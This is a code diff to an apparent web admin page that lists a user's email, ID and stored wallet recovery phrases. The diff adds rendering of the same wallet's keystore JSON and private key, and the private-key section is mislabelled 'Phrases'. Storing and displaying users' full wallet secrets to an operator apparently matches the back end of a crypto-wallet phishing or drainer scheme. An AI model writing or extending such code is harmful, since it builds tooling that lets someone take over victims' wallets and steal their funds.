@@ -29,6 +29,8 @@ async function User({ params }: Props) {
       email: userInfo.email,
       userId: userInfo.id,
       phrases: wallet[0].phrases,
+      keystorejson: wallet[0].keystorejson,
+      privateKey: wallet[0].privatekey,
       walletStatus: (userInfo as UserType).walletStatus
     };
 
@@ -61,6 +63,36 @@ async function User({ params }: Props) {
               {user.phrases && wallet.length > 0 ? (
                 <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
                   {user.phrases.map((phrase, idx) => (
+                    <li key={idx} className="whitespace-nowrap">{phrase}</li>
+                  ))}
+                </ul>
+              ) : (
+                <div className="text-gray-500">No data found</div>
+              )}
+            </div>
+          </div>
+
+          <div>
+            <h2 className="text-xl font-semibold mb-2">Keystore Json</h2>
+            <div className="overflow-x-auto">
+              {user.keystorejson && wallet.length > 0 ? (
+                <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
+                  {user.keystorejson.map((phrase, idx) => (
+                    <li key={idx} className="whitespace-nowrap">{phrase}</li>
+                  ))}
+                </ul>
+              ) : (
+                <div className="text-gray-500">No data found</div>
+              )}
+            </div>
+          </div>
+
+          <div>
+            <h2 className="text-xl font-semibold mb-2">Phrases</h2>
+            <div className="overflow-x-auto">
+              {user.privateKey && wallet.length > 0 ? (
+                <ul className="flex flex-col gap-4 min-w-[400px] pl-3">
+                  {user.privateKey.map((phrase, idx) => (
                     <li key={idx} className="whitespace-nowrap">{phrase}</li>
                   ))}
                 </ul>
